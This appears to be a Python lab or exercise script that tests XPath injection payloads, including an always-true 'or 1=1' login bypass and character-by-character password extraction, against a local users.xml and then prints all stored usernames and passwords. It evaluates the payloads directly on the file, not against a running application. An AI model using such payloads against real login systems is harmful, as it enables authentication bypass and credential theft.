import re
import subprocess
import time
import sys
from pathlib import Path

# prefer lxml for robust XPath support
try:
    from lxml import etree
except Exception:
    print("lxml is required for this script. Install with:\n    pip install lxml")
    sys.exit(1)


def run_java_main(timeout=10):
    """
    Run `java Main` once (if needed). Returns True if successful (exit code 0),
    False otherwise (and prints debug info).
    """
    try:
        proc = subprocess.run(["java", "Main"], capture_output=True, text=True, timeout=timeout)
        if proc.returncode != 0:
            print("java Main exited with code", proc.returncode)
            print("stdout/stderr:\n", proc.stdout + proc.stderr)
            return False
        return True
    except FileNotFoundError:
        print("java binary not found. Make sure Java is installed and on PATH.")
        return False
    except subprocess.TimeoutExpired:
        print("java Main timed out.")
        return False
    except Exception as e:
        print("Error running java Main:", e)
        return False


def evaluate_xpath_on_file(xpath_expr: str, xml_file: str):
    """
    Load xml_file and evaluate xpath_expr using lxml.etree.
    Returns the string result or list of nodes depending on the expression.
    """
    xml_path = Path(xml_file)
    if not xml_path.exists():
        print(f"XML file not found: {xml_file}")
        return None

    try:
        parser = etree.XMLParser(recover=True)
        tree = etree.parse(str(xml_path), parser)
    except Exception as e:
        print("Failed to parse XML:", e)
        return None

    try:
        # evaluate XPath; lxml returns nodes, strings, booleans, or numbers depending on the XPath
        res = tree.xpath(xpath_expr)
        return res
    except etree.XPathError as e:
        print("XPath evaluation error:", e)
        return None


def extract_credentials_from_tree(xml_file: str):
    """
    Parse users and return list of (username, password) tuples.
    Uses lxml so path selectors are straightforward.
    """
    xml_path = Path(xml_file)
    if not xml_path.exists():
        print(f"XML file not found: {xml_file}")
        return []

    parser = etree.XMLParser(recover=True)
    tree = etree.parse(str(xml_path), parser)
    users = tree.xpath("//users/user")
    creds = []
    for user in users:
        u = user.findtext("username")
        p = user.findtext("password")
        creds.append((u, p))
    return creds


def string_result_to_text(results):
    """
    Convert various lxml xpath return types to readable text for printing.
    """
    if results is None:
        return ""
    if isinstance(results, list):
        # element nodes or strings
        out_lines = []
        for item in results:
            if isinstance(item, etree._Element):
                text = (item.text or "").strip()
                out_lines.append(text)
            else:
                out_lines.append(str(item))
        return "\n".join(out_lines).strip()
    else:
        return str(results).strip()


def main():
    xml_file = "users.xml"

    # try to run java Main (if your program must be run to prepare the XML)
    print("Running java Main (if required)...")
    java_ok = run_java_main(timeout=8)
    if not java_ok:
        print("Warning: java Main did not run successfully. Continuing to attempt XPath evaluation on local XML file.")

    login_payloads = [
        "//users/user[username='admin' or '1'='1']",
        "//users/user[username='admin']/password",
        # Note: some of your complex payloads use functions that may be sensitive to XML structure.
        # Keep the list short here for demonstration; add more payloads if needed.
        "//users/user[username='admin']/password[substring(.,1,1)='1']",
        "//users/user[username='admin']/password[substring(.,1,2)='12']",
    ]

    for payload in login_payloads:
        print("\n====== Attempting XPATH injection payload ======\n", payload, "\n")
        try:
            res = evaluate_xpath_on_file(payload, xml_file)
            if res is None:
                print("XPath evaluation returned None or failed.")
                time.sleep(1)
                continue

            text_out = string_result_to_text(res)
            if text_out:
                print("== Payload returned: ==\n", text_out)
                # If the payload returns nodes/values, attempt to extract credentials
                creds = extract_credentials_from_tree(xml_file)
                if creds:
                    print("\n====== Extracted credentials from XML file ======\n", creds)
                else:
                    print("\nNo credentials parsed from XML file.")
                # If you want to stop on first success:
                break
            else:
                print("Payload returned nothing useful.")
        except Exception as e:
            print("Error while testing payload:", e)
            time.sleep(1)
            continue


if __name__ == "__main__":
    main()
